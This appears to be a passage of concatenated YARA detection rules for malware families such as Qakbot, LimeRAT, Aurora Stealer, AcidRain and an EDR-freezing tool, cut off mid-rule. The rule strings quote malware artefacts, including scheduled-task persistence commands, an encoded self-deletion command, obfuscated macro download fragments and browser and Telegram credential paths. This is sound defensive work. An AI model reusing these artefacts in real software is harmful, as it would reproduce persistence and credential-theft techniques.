

// ===== Source: yaraify-rules/Qakbot_WSF_loader.yar =====
rule Qakbot_WSF_loader {

  meta:
      author = "Ankit Anubhav -ankitanubhav.info"
      description = "Detects a WSF loader used to deploy Qakbot DLL"
      date = "2023-02-15"
      yarahub_author_twitter = "@ankit_anubhav"
      yarahub_author_email = "ankit.yara@inbox.ru"
      yarahub_reference_link = "https://twitter.com/ankit_anubhav"
      yarahub_reference_md5 = "ff19670725eaf5df6f3d2ca656d3db27"
      yarahub_uuid = "211e3eac-1acf-45af-bac9-e0a4c353560c"
      yarahub_license = "CC0 1.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
      malpedia_family = "win.qakbot"

   strings:

    $y = "noitcnuf" nocase
    $z = "BEGIN CERTIFICATE REQUEST" nocase

    condition:
    $y and $z and filesize < 20000

}


// ===== Source: yaraify-rules/ScanStringsInsocks5systemz.yar =====
rule ScanStringsInsocks5systemz {
	meta:
		description = "Scans presence of the found strings using the in-house brute force method"
		author = "Byambaa@pubcert.mn"
		date = "2024-10-01"
        	yarahub_uuid = "cd061b79-9264-480a-bda6-2242046143d5"
        	yarahub_license = "CC0 1.0"
        	yarahub_rule_matching_tlp = "TLP:WHITE"
        	yarahub_rule_sharing_tlp = "TLP:WHITE"
        	yarahub_reference_md5 = "73875E9DA68182B09BC6A7FAAFFF67D8"
	strings:
		$string0 = "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"
		$string1 = "$*@@@*$@@@$ *@@* $@@($*)@-$*@@$-*@@$*-@@(*$)@-*$@@*-$@@*$-@@-* $@-$ *@* $-@$ *-@$ -*@*- $@($ *)(* $)U"
	condition:
		any of them
	}


// ===== Source: yaraify-rules/Android_Admin_And_Accessibility.yar =====
rule Android_Admin_And_Accessibility
{
	meta:
		author = "Buga :3"
		date = "2024-06-26"
		description = "This detects apps which request access to both device admin and the Android accessibility suite."
		yarahub_uuid = "6d191b29-9dc4-4969-97a4-9db44471a91f"
		yarahub_license = "CC0 1.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_reference_md5 = "1b90070f260dd28c37d09ed09a993286"

	    strings:
        $permission1 = "android.permission.BIND_ACCESSIBILITY_SERVICE"
        $permission2 = "android.permission.BIND_DEVICE_ADMIN"

    condition:
        $permission1 and $permission2
}


// ===== Source: yaraify-rules/Qakbot_IsoCampaign.yar =====
rule Qakbot_IsoCampaign{
meta:
author = "Malhuters"
description = "Qakbot New Campaign ISO"
date = "2022-10-06"
yarahub_reference_md5 = "456373BC4955E0B6750E8791AB84F004"
yarahub_uuid = "cef91a6a-f270-4c35-87a4-98b6f78096db"
yarahub_license = "CC0 1.0"
yarahub_rule_matching_tlp = "TLP:WHITE"
yarahub_rule_sharing_tlp = "TLP:WHITE"
malpedia_family = "win.qakbot"
strings:
$str1 = "CD001"
$str2 = "This disc contains Unicode file names and requires an operating system"
$str3 = "such as Microsoft Windows 95 or Microsoft Windows NT 4.0."
$str4 = "README.TXT"
$str5 = "Windows"
$str6 = "C:\\Windows\\System32\\cmd.exe"
$str7 = "%SystemRoot%\\System32\\shell32.dll"
$str8 = "desktop-"
$str9 = ">CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), default quality"
condition:
(5 of ($str*)) 
}


// ===== Source: yaraify-rules/LimeRAT.yar =====
rule LimeRAT
{
    meta:
        description = "Detects Lime RAT malware samples based on the strings matched"
        author = "RustyNoob619"
        date = "2024-01-25"
        yarahub_author_twitter = "@RustyNoob619"
        source = "https://valhalla.nextron-systems.com/info/rule/MAL_LimeRAT_Mar23"
        hash = "b62f72df91cffe7861b84a38070e25834ca32334bea0a0e25274a60a242ea669"
        yarahub_reference_md5 = "a58086585317b4551730a11000b8cfa3"
        yarahub_uuid = "61ed8f5d-be64-4d6a-bdb3-69632195501a"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        malpedia_family = "win.limerat"
    strings:
        $main = "schtasks /create /f /sc ONLOGON /RL HIGHEST /tn LimeRAT-Admin /tr" wide 
        $cmd1 = "Flood!" wide
        $cmd2 = "!PSend" wide  
        $cmd3 = "!PStart" wide  
        $cmd4 = "SELECT * FROM AntivirusProduct" wide  
        $cmd5 = "Select * from Win32_ComputerSystem" wide  
        $cmd6 = "_USB Error!" wide
        $cmd7 = "_PIN Error!" wide
        
        
    condition:
        uint16(0) == 0x5A4D
        and $main
        and 4 of ($cmd*)
}


// ===== Source: yaraify-rules/Suspicious_PowerShellObjectCreation.yar =====
rule Suspicious_PowerShellObjectCreation
{
	meta:
		date = "2025-02-13"
		yarahub_author_twitter = "@AzakaSekai_"
		yarahub_license = "CC BY-NC 4.0"
		yarahub_reference_md5 = "7ee13c839f3af9ca9a4e8b692f7018fa"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_uuid = "c88d3adb-5b6e-4b9a-b7fc-e15a409a55ad"
	strings:
		$base_1 = /\$ExecutionContext ?\| ?(Get-Member|gm)/ ascii nocase
		$optional_1 = "GetCommand" ascii nocase fullword
		$optional_2 = "Cmdlet" ascii nocase fullword
		$optional_3 = "PsObject" ascii nocase fullword
		$optional_4 = ")[6].Name)" ascii nocase fullword
	condition:
		$base_1 and
		2 of ($optional_*)
}


// ===== Source: yaraify-rules/SilverRAT.yar =====
rule SilverRAT {
    meta:
        author = "NDA0E"
        yarahub_author_twitter = "@NDA0E"
        date = "2024-10-28"
        description = "Detects SilverRAT"
        yarahub_uuid = "1ee8e50d-0059-4125-9409-d23305359383"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "5ec3267acfd4ef36cbfb796016142892"
        
    strings:
        $Online = "You have a client online now" wide ascii
        $AutoRun = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" wide ascii
        $Keyloaggr = "Keyloaggr" ascii
        
    condition:
        uint16(0) == 0x5a4d and
        all of them
}


// ===== Source: yaraify-rules/EDR_Killer_EDR_Freeze_Tool.yar =====
rule EDR_Killer_EDR_Freeze_Tool {
    meta:
        description = "Detects EDR-Freeze tool in memory - EDR/AV freezing malware"
        author = "Valton Tahiri (cybee.ai)"
        date = "2025-10-09"
        reference = "https://www.linkedin.com/in/valton-tahiri/"
        severity = "critical"
        category = "edr_killer"
        malware_family = "EDR-Freeze"
        hash_sample = "ff6f1a93c2e0b46d9a3e18c75d"
        yarahub_reference_md5 = "2c8fbd0f7fd0ed8ebcacb087c8faa6f3"
        yarahub_uuid = "e7b8c5f5-7d3f-4e02-9b3c-2f3f0a2a3c9d"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"

    strings:
        $tool_banner = "EDR-Freeze: Tool that freezes EDR/Antivirus" ascii wide
        $pdb_path = "D:\\Projects\\PPL\\EDR-Freeze\\x64\\Release\\EDR-Freeze.pdb" ascii wide
        $usage1 = "EDR-Freeze.exe <TargetPID> <SleepTime>" ascii wide
        $usage2 = "EDR-Freeze.exe 1234 10000" ascii wide
        $op_freeze = "Freeze the target for 10000 milliseconds" ascii wide
        $op_ppl_create = "Successfully created PPL process with PID:" ascii wide
        $op_target_paused = "Target paused. PID:" ascii wide
        $op_wer_paused = "WER paused. PID:" ascii wide
        $op_kill_wer_success = "Kill WER successfully. PID:" ascii wide
        $op_kill_wer_failed = "Kill WER failed:" ascii wide
        $msg_suspended = "Process suspended successfully." ascii wide
        $msg_terminated = "Process terminated successfully." ascii wide
        $prot_level1 = "PROTECTION_LEVEL_ANTIMALWARE_LIGHT" ascii wide
        $prot_level2 = "PROTECTION_LEVEL_WINTCB_LIGHT" ascii wide
        $prot_level3 = "PROTECTION_LEVEL_WINDOWS_LIGHT" ascii wide
        $prot_level4 = "PROTECTION_LEVEL_LSA_LIGHT" ascii wide
        $prot_level5 = "PROTECTION_LEVEL_WINDOWS" ascii wide
        $prot_display = "Protection Level:" ascii wide
        $err_ppl_create = "Failed to create PPL process." ascii wide
        $err_main_thread = "Failed to find main thread for PID" ascii wide
        $err_update_proc = "UpdateProcThreadAttribute failed:" ascii wide
        $err_init_proc = "InitializeProcThreadAttributeList failed:" ascii wide
        $priv_debug = "SeDebugPrivilege enabled successfully." ascii wide
        $priv_failed = "Failed to enable debug privilege." ascii wide
        $api_suspend = "OpenProcess: PROCESS_SUSPEND_RESUME failed:" ascii wide
        $api_ntsuspend = "NtSuspendProcess failed. Error code:" ascii wide
        $target_wer = "C:\\Windows\\System32\\WerFaultSecure.exe" ascii wide
        $author_twitter = "Two Seven One Three: https://x.com/TwoSevenOneT" ascii wide
        $ntapi_suspend = "NtSuspendProcess" ascii wide
        $ntapi_query = "NtQuerySystemInformation" ascii wide

    condition:
        uint16(0) == 0x5A4D and
        (
            ($tool_banner or $pdb_path) or
            (3 of ($op_*)) or
            (2 of ($prot_level*) and 2 of ($op_*)) or
            (any of ($usage*) and 2 of ($op_*)) or
            ($author_twitter and 2 of ($op_*)) or
            (any of ($priv_*) and $target_wer and 2 of ($op_*)) or
            (2 of ($err_*) and any of ($ntapi_*) and any of ($prot_*)) or
            (any of ($msg_*) and 2 of ($op_*) and any of ($ntapi_*)) or
            (any of ($api_*) and 2 of ($op_*) and any of ($prot_level*))
        )
}


// ===== Source: yaraify-rules/win_laplas_clipper_9c96.yar =====
rule win_laplas_clipper_9c96 {

    meta:
        author                    = "Johannes Bader"
        date                      = "2022-11-09"
        description               = "detects unpacked Laplas Clipper"
        hash1_md5                 = "3afb4573dea2dbac4bb5f1915f7a4dce"
        hash1_sha1                = "9ad8b880f3ab35f0d1a7fe46d9d8e0bea36e0d14"
        hash1_sha256              = "52901dc481d1be2129725e3c4810ae895f9840e27a1dce69630dedcf71b6c021"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "3afb4573dea2dbac4bb5f1915f7a4dce"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
	yarahub_uuid              = "5f272188-cabb-441a-8278-b9b82fe4d653"


    strings:
        $func_names_0 = "main.request"
        $func_names_1 = "main.setOnline"
        $func_names_2 = "main.getRegex"
        $func_names_3 = "main.getAddress"
        $func_names_4 = "main.waitOpenClipboard"
        $func_names_5 = "main.clipboardRead"
        $func_names_6 = "main.clipboardWrite"
        $func_names_7 = "main.startHandler"
        $func_names_8 = "main.isRunning"
        $func_names_9 = "main.main"
        $func_names_10 = "main.isStartupEnabled"
        $func_names_11 = "main.decrypt"
        $func_names_12 = "main.existsPath"
        $func_names_13 = "main.getPid"
        $func_names_14 = "main.writePid"
        $func_names_15 = "main.enableStartup"
        $func_names_16 = "main.copyFile"
        $func_names_17 = "main.clipboardWrite.func1"
        $func_names_18 = "main.init"

        $startup_0 = "/sc"
        $startup_1 = "/ri"
        $startup_2 = "/st"
        $startup_3 = "/tr"
        $startup_4 = "/tn"
        $startup_5 = "/create"
        $startup_6 = "/C"
        $startup_7 = "once"
        $startup_8 = "cmd.exe"
        $startup_9 = "9999:59"
        $startup_10 = "00:00"

        $request_0 = "http://"
        $request_1 = "/bot/"
        $request_2 = "key="

    condition:
        uint16(0) == 0x5A4D and
        17 of ($func_names_*)  and
        9 of ($startup_*) and
        all of ($request_*)
}


// ===== Source: yaraify-rules/MALWARE_Storm0978_Underground_Ransomware_Jul23.yar =====
rule MALWARE_Storm0978_Underground_Ransomware_Jul23
{
    meta:
        author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
        description = "Hunting rule for samples of 'Underground Ransomware', linked to IndustrialSpy and Storm-0978"
        reference = "https://twitter.com/RakeshKrish12/status/1678296344061157377"
        date = "2023-07-12"
        tlp = "CLEAR"
        hash = "d4a847fa9c4c7130a852a2e197b205493170a8b44426d9ec481fc4b285a92666"
        yarahub_uuid = "4ed613b6-9ed6-424c-a3b1-79855eebc0fa"
        yarahub_reference_md5 = "059175be5681a633190cd9631e2975f6"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_author_twitter = "@SI_FalconTeam"

    strings:
        $s_1 = "temp.cmd" wide
        $s_2 = "%s\\!!readme!!!.txt" wide
        $s_3 = "VIPinfo.txt" wide
        $s_4 = "The Underground team welcomes you!" ascii
        $s_5 = "http://undgrddapc4reaunnrdrmnagvdelqfvmgycuvilgwb5uxm25sxawaoqd.onion"
        $s_6 = "File unlocking error" wide

    condition:
        uint16(0) == 0x5a4d
        and 4 of ($s_*)
}


// ===== Source: yaraify-rules/ELF_Wiper_AcidRain_March2024.yar =====
rule ELF_Wiper_AcidRain_March2024 {
    meta:
        Description = "Detects the Acid Rain Wiper Malware"
        author = "Yashraj Solanki - Cyber Threat Intelligence Analyst at Bridewell"
        Credits = "@ShanHolo for sharing the malware file hash and key characteristics"
        Reference = "https://twitter.com/ShanHolo/status/1770083206773002267"
        File_Hash = "6a8824048417abe156a16455b8e29170f8347312894fde2aabe644c4995d7728"
        date = "2024-03-20"
        yarahub_author_twitter = "@RustyNoob619"
        yarahub_reference_md5 = "1bde1e4ecc8a85cffef1cd4e5379aa44"
        yarahub_uuid = "b7279bbd-4112-44fd-8696-ba837096518e"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        malpedia_family = "win.acridrain"

    strings:
        $dev1 = "/dev/sdXX" fullword ascii
        $dev2 = "/dev/null" fullword ascii
        $dev3 = "/dev/dm-XX" fullword ascii
        $dev4 = "/dev/block/mtdblockXX" fullword ascii
        $dev5 = "/dev/mtdblockXX" fullword ascii
        $dev6 = "/dev/mmcblkXX" fullword ascii
        $dev7 = "/dev/ubiXX" fullword ascii
        $dev8 = "/dev/loopXX" fullword ascii
        $dev9 = "/dev/block/mmcblkXX" fullword ascii
        $dev10 = "/dev/mtdXX" fullword ascii
        $usr1 = "/usr/sbin/reboot" fullword ascii
        $usr2 = "/usr/bin/reboot" fullword ascii
        $proc = "/proc/self/exe" fullword ascii

    condition:
        uint32be(0) == 0x7f454c46 //ELF Header
        and $proc
        and 1 of ($usr*) 
        and 3 of ($dev*)
 }


// ===== Source: yaraify-rules/SUS_Unsigned_APPX_MSIX_Manifest_Feb23.yar =====
rule SUS_Unsigned_APPX_MSIX_Manifest_Feb23
{
	meta:
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		description = "Detects suspicious Microsoft Windows APPX/MSIX Installer Manifests"
		reference = "https://twitter.com/SI_FalconTeam/status/1620500572481945600"
		date = "2023-02-01"
		tlp = "CLEAR"
		yarahub_reference_md5 = "69660f5abb08fc430cf756a44d19e039"
		yarahub_uuid = "06b5fba4-6b6d-41f8-9910-cce86eabbde4"
		yarahub_license = "CC BY 4.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_author_twitter = "@SI_FalconTeam"

	strings:
		$xlmns = "http://schemas.microsoft.com/appx/manifest/"
		
		// as documented here: https://learn.microsoft.com/en-us/windows/msix/package/unsigned-package
		$identity = "OID.2.25.311729368913984317654407730594956997722=1"
		
		$s_entrypoint = "EntryPoint=\"Windows.FullTrustApplication\""
		$s_capability = "runFullTrust"
		$s_peExt = ".exe"

	condition:
		uint32be(0x0) == 0x3C3F786D
		and $xlmns
		and $identity
		and 2 of ($s*)
}


// ===== Source: yaraify-rules/Gh0st_PythonLoader.yar =====
rule Gh0st_PythonLoader
{
	meta:
		author = "Still"
		component_name = "Gh0st"
		date = "2025-04-12"
		malpedia_family = "win.ghost_rat"
		yarahub_author_twitter = "@AzakaSekai_"
		yarahub_license = "CC BY-NC 4.0"
		yarahub_reference_md5 = "2dc68441b200ee3014a40c95e2dfc6e1"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_uuid = "64863e2c-fd88-4077-8a8c-fd196d84a6ea"
		description = "Matches an unknown Gh0st variant Python loader"
	strings:
		$str_1 = "def ecute(lcode):" ascii fullword
		$str_2 = "No to cute." ascii fullword
		$str_3 = "Always cute when imported" ascii fullword
		$str_4 = "code_size, 0x40, ctypes.byref(old_protect)" ascii fullword
		$str_5 = "code_func = codeFunction(" ascii fullword
		$str_6 = "None, code_size, 0x3000, 0x04)" ascii fullword
	condition:
		3 of ($str_*)
}


// ===== Source: yaraify-rules/OleDownloader.yar =====
rule OleDownloader
{
    meta:
        author = "Madhav"
        description = "This is a ole file which is accessing some url"
        date = "2025-05-09"
	yarahub_reference_md5 = "bff78436218e2ade64470c183020168e"
	yarahub_uuid = "8623936b-908a-4e37-b140-c5a947d00324"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
    
    strings:
        $mal1 = "\"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\""
        $mal2 = "\"M\", \"S\", \"X\", \"M\", \"L\", \"2\", \".\", \"X\", \"M\", \"L\", \"H\", \"T\", \"T\", \"P\""
        $mal3 = ".exe"
        $mal4 = "\"A\", \"D\", \"O\", \"D\", \"B\", \".\", \"S\", \"t\", \"r\", \"e\", \"a\", \"m\""
        $mal5 = "winmgmts:\\\\.\\root\\cimv2"
        $mal6 = "\"c\" & \"m\" & \"d /\" & \"c \""
        $autoopen = "Sub AutoOpen()"
        $docopen = "Sub Document_Open()"
    
    condition:
        $mal1 and $mal2 and $mal3 and $mal4 and $mal5 and $mal6 and $autoopen and $docopen
}


// ===== Source: yaraify-rules/Suspicious_Process.yar =====
rule Suspicious_Process {
    meta:
        description = "Suspicious process creation"
        author = "Security Research Team"
        date = "2024-11-27"
        yarahub_uuid = "0fcee061-50c2-404d-9854-c67b78287c64"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "d41d8cd98f00b204e9800998ecf8427e"
        license = "MIT"
        threat_type = "Suspicious Behavior"
        severity = "Medium"
        
    strings:
        $proc1 = "svchost.exe" nocase
        $proc2 = "rundll32.exe" nocase
        $proc3 = "powershell.exe" nocase
        $arg1 = "-enc" nocase
        $arg2 = "/c" nocase
        $net1 = "http://" nocase
        
    condition:
        (
            ($proc1 or $proc2 or $proc3) and
            ($arg1 or $arg2) and
            ($net1)
        )
}


// ===== Source: yaraify-rules/SUS_Unsigned_APPX_MSIX_Installer_Feb23.yar =====
rule SUS_Unsigned_APPX_MSIX_Installer_Feb23
{
	meta:
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		description = "Detects suspicious, unsigned Microsoft Windows APPX/MSIX Installer Packages"
		reference = "https://twitter.com/SI_FalconTeam/status/1620500572481945600"
		date = "2023-02-01"
		tlp = "CLEAR"
		yarahub_reference_md5 = "69660f5abb08fc430cf756a44d19e039"
		yarahub_uuid = "3eaac733-4ab9-40e1-93fe-3dbed6d458e8"
		yarahub_license = "CC BY 4.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_author_twitter = "@SI_FalconTeam"

	strings:
		$s_manifest = "AppxManifest.xml"
		$s_block = "AppxBlockMap.xml"
		$s_peExt = ".exe"

		// we are not looking for signed packages
		$sig = "AppxSignature.p7x"

	condition:
		uint16be(0x0) == 0x504B
		and 2 of ($s*)
		and not $sig
}


// ===== Source: yaraify-rules/RABBITHUNT_loader.yar =====
rule RABBITHUNT_loader {
  meta:
    date = "2022-06-13"
    author = "Willi Ballenthin"
    yarahub_author_email = "william.ballenthin@mandiant.com"
    yarahub_author_twitter = "@williballenthin"
    yarahub_uuid = "a0476975-9fb5-410e-90be-1a4acd6398e3"
    yarahub_license = "CC BY 4.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp = "TLP:WHITE"
    yarahub_reference_md5 = "22a968beda8a033eb31ae175b7e0a937"
  strings:
        $a = "kernel32.dll:LoadLibraryA"
        $b = "kernel32.dll:VirtualFree"
        $c = "kernel32.dll:VirtualAlloc"
        $d = "kernel32.dll:UnmapViewOfFile"
        $e = "kernel32.dll:GetFileAttributesW"
        $f = "kernel32.dll:GetFileSize"
        $g = "kernel32.dll:MapViewOfFile"
        $h = "kernel32.dll:CloseHandle"
        $i = "kernel32.dll:CreateFileW"
        $j = "kernel32.dll:CreateFileMappingW"
        
  condition:
    any of them
}


// ===== Source: yaraify-rules/MacOS_Stealer.yar =====
rule MacOS_Stealer
{
    meta:
        description = "Detects MacOS stealer malware attributed to 'mentalpositive'"
        author = "dogsafetyforeverone"
        date = "2025-04-20"
        version = "1.0"
        malware_family = "MacOSStealer"
        reference = "MacOS stealer malware"
        yarahub_reference_md5 = "342dda1ffc615e5f954481fecd765dd3"
        yarahub_uuid = "3df114d9-6cef-454c-9de7-90b41870f657"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"

    strings:
        $func1 = "_CollectBrowsers"
        $func2 = "_CollectCryptowallets"
        $func3 = "_CollectData"
        $func4 = "_CollectExtensions"
        $func5 = "_CollectSync"
        $func6 = "_ExtensionsID"
        $func7 = "_ExtractPassword"
        $func8 = "_GetPasswordModal"
        $func9 = "_GetProfiles"
        $func10 = "_PasswordValidator"

    condition:
        all of ($func*)
}


// ===== Source: yaraify-rules/mht_inside_word.yar =====
rule mht_inside_word{
	meta:
		author = "dPhish"
		description = "Detect embedded mht files inside microsfot word."
		date = "2025-07-28"
		yarahub_reference_md5 = "24E5E160DB26CD18ED094F9514BB8688"
		yarahub_uuid = "3ee65036-6000-423c-b7e2-bfde20e7494a"
		yarahub_license = "CC0 1.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
	strings:
	    $mht = ".mht"
	condition:
        	 $mht
}


// ===== Source: yaraify-rules/RANSOMWARE.yar =====
rule RANSOMWARE {
	meta:
		author = "ToroGuitar"
		Description = "This rule is meant to catch different types of ransomware."
		date = "2024-09-02"
		yarahub_reference_md5 = "b0fd45162c2219e14bdccab76f33946e"
		yarahub_uuid = "960a3047-a95b-44b2-acf3-307196a680c2"
		yarahub_license = "CC0 1.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
	strings:
		$a = ".onion"
		$b = "torproject.org"
		$c = "PartialFileCrypter"
		$d = "ransomware"
		$e = "infected"
		$f = "encrypted"
	condition:
		any of them
}


// ===== Source: yaraify-rules/SUSP_RTF_with_potential_CVE_2026_21509_exploit_nows.yar =====
rule SUSP_RTF_with_potential_CVE_2026_21509_exploit_nows
{
    meta:
        description = "Detects RTF files containing a Shell.Explorer.1 OLE object, possibly an exploit for CVE-2026-21509"
        author = "Philippe Lagadec"
        reference = "https://decalage.info/CVE-2026-21509/"
        version = "1.3"
        date = "2026-02-03"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        // samples: https://bazaar.abuse.ch/browse/tag/CVE-2026-21509/
        yarahub_uuid = "f8a081ff-830c-4f30-8bad-168d2a582324"
        yarahub_license = "CC BY-SA 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "7c396677848776f9824ebe408bbba943"

    strings:
        // RTF file signature
        $rtf_header = "{\\rt"
        // OLE object data
        $ole_object = "\\objdata"

        // This regex matches the Shell.Explorer CLSID hex-encoded without whitespace
        // (which is faster than the whitespace version, but can miss some detections)
        $clsid = "C32AB2EAC130CF11A7EB0000C05BAE0B" nocase

    condition:
        // File must start with RTF header
        $rtf_header at 0 and
        // and contain an OLE object
        $ole_object and
        // And contain the CLSID string
        $clsid
}


// ===== Source: yaraify-rules/win_limerat_j1_00cfd931.yar =====
rule win_limerat_j1_00cfd931 {

    meta:
        author                    = "Johannes Bader"
        date                      = "2021-10-01"
        description               = "detects the lime rat"
        hash                      = "2a0575b66a700edb40a07434895bf7a9"
        malpedia_family           = "win.limerat"
        tlp                       = "TLP:WHITE"
        version                   = "v1.1"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "2a0575b66a700edb40a07434895bf7a9"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "00cfd931-3e03-4e32-b0d7-ca8f6bbfe062"

    strings:
        $str_1 = "Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA=" wide
        $str_2 = "schtasks /create /f /sc ONLOGON /RL HIGHEST /tn LimeRAT-Admin" wide
        $str_3 = "Minning..." wide
        $str_4 = "--donate-level=" wide

    condition:
        uint16(0) == 0x5A4D and
        3 of them
}


// ===== Source: yaraify-rules/android_apk_hook.yar =====
rule android_apk_hook
      {
        meta:
          date = "2023-04-12"
          yarahub_reference_md5 = "bd00ea0d160476fc35403a954714db46"
          yarahub_uuid = "1cf204a2-7d44-4114-8c74-d8987a299626"
          yarahub_license = "CC BY 4.0"
          yarahub_rule_matching_tlp = "TLP:WHITE"
          yarahub_rule_sharing_tlp = "TLP:WHITE"
          malwaretype = "Hook - https://malpedia.caad.fkie.fraunhofer.de/details/apk.hook"
          filetype = "apk"

        strings:
          $aes_key = "1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf"
          $hook_wa_cmd = "openwhatsapp"

        condition:
          all of them
      }


// ===== Source: yaraify-rules/win_aurora_stealer_a_706a.yar =====
rule win_aurora_stealer_a_706a {

    meta:
        author                    = "Johannes Bader"
        date                      = "2022-12-14"
        description               = "detects Aurora Stealer samples"
        hash1_md5                 = "51c153501e991f6ce4901e6d9578d0c8"
        hash1_sha1                = "3816f17052b28603855bde3e57db77a8455bdea4"
        hash1_sha256              = "c148c449e1f6c4c53a7278090453d935d1ab71c3e8b69511f98993b6057f612d"
        hash2_md5                 = "65692e1d5b98225dbfb1b6b2b8935689"
        hash2_sha1                = "0b51765c175954c9e47c39309e020bcb0f90b783"
        hash2_sha256              = "5a42aa4fc8180c7489ce54d7a43f19d49136bd15ed7decf81f6e9e638bdaee2b"
        malpedia_family           = "win.aurora_stealer"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "51c153501e991f6ce4901e6d9578d0c8"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "706a5977-69fb-44ae-bfa7-f61e214148e7"

    strings:

        $str_func_01 = "main.(*DATA_BLOB).ToByteArray"
        $str_func_02 = "main.Base64Encode"
        $str_func_03 = "main.Capture"
        $str_func_04 = "main.CaptureRect"
        $str_func_05 = "main.ConnectToServer"
        $str_func_06 = "main.CreateImage"
        $str_func_07 = "main.FileExsist"
        $str_func_08 = "main.GetDisplayBounds"
        $str_func_09 = "main.GetInfoUser"
        $str_func_10 = "main.GetOS"
        $str_func_11 = "main.Grab"
        $str_func_12 = "main.MachineID"
        $str_func_13 = "main.NewBlob"
        $str_func_14 = "main.NumActiveDisplays"
        $str_func_15 = "main.PathTrans"
        $str_func_16 = "main.SendToServer_NEW"
        $str_func_17 = "main.SetUsermame"
        $str_func_18 = "main.Zip"
        $str_func_19 = "main.base64Decode"
        $str_func_20 = "main.countupMonitorCallback"
        $str_func_21 = "main.enumDisplayMonitors"
        $str_func_22 = "main.getCPU"
        $str_func_23 = "main.getDesktopWindow"
        $str_func_24 = "main.getGPU"
        $str_func_25 = "main.getMasterKey"
        $str_func_26 = "main.getMonitorBoundsCallback"
        $str_func_27 = "main.getMonitorRealSize"
        $str_func_28 = "main.sysTotalMemory"
        $str_func_29 = "main.xDecrypt"

        $str_type_01 = "type..eq.main.Browser_G"
        $str_type_02 = "type..eq.main.STRUSER"
        $str_type_03 = "type..eq.main.Telegram_G"
        $str_type_04 = "type..eq.main.Crypto_G"
        $str_type_05 = "type..eq.main.ScreenShot_G"
        $str_type_06 = "type..eq.main.FileGrabber_G"
        $str_type_07 = "type..eq.main.FTP_G"
        $str_type_08 = "type..eq.main.Steam_G"
        $str_type_09 = "type..eq.main.DATA_BLOB"
        $str_type_10 = "type..eq.main.Grabber"

        $varia_01 = "\\User Data\\Local State"
        $varia_02 = "\\\\Opera Stable\\\\Local State"
        $varia_03 = "Reconnect 1"
        $varia_04 = "@ftmone"
        $varia_05 = "^user^"
        $varia_06 = "wmic path win32_VideoController get name"
        $varia_07 = "\\AppData\\Roaming\\Telegram Desktop\\tdata"
        $varia_08 = "C:\\Windows.old\\Users\\"
        $varia_09 = "ScreenShot"
        $varia_10 = "Crypto"

    condition:
        uint16(0) == 0x5A4D and
        (
            32 of ($str_*) or
            9 of ($varia_*)
        )
}


// ===== Source: yaraify-rules/win_origin_logger_b5c8.yar =====
rule win_origin_logger_b5c8 {

    meta:
        author                    = "Johannes Bader"
        date                      = "2022-09-22"
